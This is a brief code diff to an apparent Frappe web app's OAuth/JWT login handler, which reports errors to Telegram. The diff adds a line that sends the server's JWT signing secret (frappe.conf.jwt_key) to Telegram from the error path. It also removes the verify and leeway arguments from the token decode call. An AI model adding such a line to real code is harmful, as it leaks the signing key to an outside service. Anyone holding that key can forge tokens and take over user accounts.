@@ -41,10 +41,10 @@ def get_context(context):
         send_msg_telegram(frappe.local.request_ip)
         send_msg_telegram(frappe.local.request.query_string)
         send_msg_telegram(traceback.format_exc())
-
+        send_msg_telegram(frappe.conf.jwt_key)
 
 def login_oauth_user(token):
-    data = jwt.decode(token, frappe.conf.jwt_key, verify=True, leeway=10,
+    data = jwt.decode(token, frappe.conf.jwt_key,
                       algorithms=['HS256'])
 
     email = data['email']
